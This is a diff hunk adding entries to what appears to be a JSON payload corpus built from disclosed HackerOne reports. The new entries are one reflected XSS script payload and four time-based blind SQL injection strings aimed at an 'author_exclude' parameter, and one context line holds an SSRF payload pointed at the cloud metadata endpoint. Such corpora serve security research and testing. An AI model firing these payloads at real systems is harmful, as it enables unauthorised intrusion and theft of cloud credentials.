@@ -27285,6 +27285,91 @@
     }
   },
   {
+    "id": "679e05ef",
+    "class": "xss",
+    "payload": "<br>\n<script>alert(document.domain)</script> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588, Tel: 123\n<br>",
+    "technique": "Reflected cross\u2011site scripting (XSS) by injecting a <script> tag that executes alert(document.domain)",
+    "param": null,
+    "report": {
+      "id": 3830771,
+      "url": "https://hackerone.com/reports/3830771",
+      "title": "Reflected XSS in legacy CGI script /cgi-bin/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.pl on \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 via `\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588` parameter",
+      "program": "Essity",
+      "reporter": "marioniangi",
+      "severity": "high",
+      "bounty": null,
+      "disclosed_at": "2026-06-30"
+    }
+  },
+  {
+    "id": "556d69c0",
+    "class": "sqli",
+    "payload": "author_exclude=1) OR SLEEP(N)-- -",
+    "technique": "Time\u2011based blind SQL injection using the SLEEP function to cause a delay",
+    "param": "author_exclude",
+    "report": {
+      "id": 3873072,
+      "url": "https://hackerone.com/reports/3873072",
+      "title": "Unauthenticated SQL Injection via REST Batch Route Confusion \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
+      "program": "Essity",
+      "reporter": "matty69v",
+      "severity": "critical",
+      "bounty": null,
+      "disclosed_at": "2026-07-21"
+    }
+  },
+  {
+    "id": "c60ca60a",
+    "class": "sqli",
+    "payload": "1) OR SLEEP(0)-- -",
+    "technique": "Time\u2011based blind SQL injection using SLEEP with zero delay as a proof of concept",
+    "param": "author_exclude",
+    "report": {
+      "id": 3873072,
+      "url": "https://hackerone.com/reports/3873072",
+      "title": "Unauthenticated SQL Injection via REST Batch Route Confusion \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
+      "program": "Essity",
+      "reporter": "matty69v",
+      "severity": "critical",
+      "bounty": null,
+      "disclosed_at": "2026-07-21"
+    }
+  },
+  {
+    "id": "d4a4bd5b",
+    "class": "sqli",
+    "payload": "1) OR SLEEP(0.01)-- -",
+    "technique": "Time\u2011based blind SQL injection using SLEEP with a fractional delay (0.01\u202fs)",
+    "param": "author_exclude",
+    "report": {
+      "id": 3873072,
+      "url": "https://hackerone.com/reports/3873072",
+      "title": "Unauthenticated SQL Injection via REST Batch Route Confusion \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
+      "program": "Essity",
+      "reporter": "matty69v",
+      "severity": "critical",
+      "bounty": null,
+      "disclosed_at": "2026-07-21"
+    }
+  },
+  {
+    "id": "b214eeb6",
+    "class": "sqli",
+    "payload": "1) OR SLEEP(0.3)-- -",
+    "technique": "Time\u2011based blind SQL injection using SLEEP with a longer delay (0.3\u202fs)",
+    "param": "author_exclude",
+    "report": {
+      "id": 3873072,
+      "url": "https://hackerone.com/reports/3873072",
+      "title": "Unauthenticated SQL Injection via REST Batch Route Confusion \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
+      "program": "Essity",
+      "reporter": "matty69v",
+      "severity": "critical",
+      "bounty": null,
+      "disclosed_at": "2026-07-21"
+    }
+  },
+  {
     "id": "d05ba2d2",
     "class": "ssrf",
     "payload": "http:///169.254.169.254/latest/meta-data/",
